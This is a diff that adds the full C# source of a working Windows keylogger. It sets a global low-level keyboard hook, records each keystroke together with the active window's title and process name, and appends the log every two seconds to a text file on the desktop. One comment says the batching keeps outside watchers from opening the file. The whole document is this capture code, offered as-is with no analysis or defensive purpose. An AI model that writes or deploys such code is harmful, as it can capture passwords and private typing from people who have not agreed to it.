@@ -1,0 +1,179 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using System.Collections.Concurrent;
+using System.Threading;
+using System.Diagnostics;
+using System.Text;
+
+class Program
+{
+    private const int WH_KEYBOARD_LL = 13;
+
+    [STAThread]
+    public static void Main(string[] args)
+    {
+        using (var keyLogger = new KeyLogger())
+        {
+            Application.Run(); // Message loop required for global hooks
+        }
+    }
+
+    class KeyLogger : IDisposable
+    {
+        private const int WM_KEYDOWN = 0x0100;
+
+        private HookProc _hookProc;
+        private IntPtr _hModule;
+        private IntPtr _hookHandle;
+
+        // Logging
+        private readonly ConcurrentQueue<string> _logQueue = new ConcurrentQueue<string>();
+        private readonly System.Threading.Timer _flushTimer;
+        private readonly string _logPath;
+
+        // Foreground window tracking
+        private IntPtr _lastForeground = IntPtr.Zero;
+
+        public KeyLogger()
+        {
+            _hookProc = new HookProc(HookCallback);
+            _hModule = GetModuleHandle(null);
+            _hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, _hModule, 0);
+
+            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+            _logPath = Path.Combine(desktop, "loger.txt");
+            Directory.CreateDirectory(Path.GetDirectoryName(_logPath) ?? desktop);
+
+            // Flush queue every 2 seconds to avoid frequent file writes (reduces external watchers opening the file)
+            _flushTimer = new System.Threading.Timer(_ => FlushQueueSafe(), null, 2000, 2000);
+        }
+
+        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            // Only handle key down to avoid double entries
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && lParam != IntPtr.Zero)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+
+                // Simple mapping for A-Z and Space; other keys will be recorded in brackets
+                string toLog;
+                if (vkCode >= (int)Keys.A && vkCode <= (int)Keys.Z)
+                {
+                    bool shift = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
+                    bool caps = (GetKeyState(0x14) & 0x0001) != 0; // VK_CAPITAL
+                    char c = (char)('a' + (vkCode - (int)Keys.A));
+                    if (shift ^ caps) c = char.ToUpperInvariant(c);
+                    toLog = c.ToString();
+                }
+                else if (vkCode == (int)Keys.Space)
+                {
+                    toLog = " ";
+                }
+                else
+                {
+                    toLog = $"[{((Keys)vkCode).ToString()}]";
+                }
+
+                // Enqueue with a trailing space so entries appear side-by-side
+                _logQueue.Enqueue(toLog + " ");
+                Console.Write(toLog);
+            }
+
+            // Also check for foreground window changes (lightweight poll on each hook call)
+            try
+            {
+                IntPtr fg = GetForegroundWindow();
+                if (fg != _lastForeground && fg != IntPtr.Zero)
+                {
+                    _lastForeground = fg;
+                    int pid;
+                    GetWindowThreadProcessId(fg, out pid);
+                    string title = GetWindowTitle(fg);
+                    string procName = "";
+                    try { procName = Process.GetProcessById(pid).ProcessName; } catch { }
+                    _logQueue.Enqueue($"\n[Window] {procName}: {title}\n");
+                }
+            }
+            catch { }
+
+            return CallNextHookEx(_hookHandle, nCode, wParam, lParam);
+        }
+
+        private void FlushQueueSafe()
+        {
+            try { FlushQueue(); } catch { }
+        }
+
+        private void FlushQueue()
+        {
+            if (_logQueue.IsEmpty) return;
+            var sb = new StringBuilder();
+            while (_logQueue.TryDequeue(out var item)) sb.Append(item);
+            // Append to file in one operation
+            File.AppendAllText(_logPath, sb.ToString(), Encoding.UTF8);
+        }
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        public void Dispose()
+        {
+            if (_hookHandle != IntPtr.Zero)
+            {
+                UnhookWindowsHookEx(_hookHandle);
+                _hookHandle = IntPtr.Zero;
+            }
+            try
+            {
+                _flushTimer?.Dispose();
+            }
+            catch { }
+            try { FlushQueueSafe(); } catch { }
+        }
+
+        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll")]
+        private static extern short GetAsyncKeyState(int vKey);
+
+        [DllImport("user32.dll")]
+        private static extern short GetKeyState(int nVirtKey);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        private static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);
+
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+
+        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern int GetWindowTextLength(IntPtr hWnd);
+
+        private static string GetWindowTitle(IntPtr hWnd)
+        {
+            try
+            {
+                int len = GetWindowTextLength(hWnd);
+                if (len <= 0) return string.Empty;
+                var sb = new StringBuilder(len + 1);
+                GetWindowText(hWnd, sb, sb.Capacity);
+                return sb.ToString();
+            }
+            catch { return string.Empty; }
+        }
+    }
+}
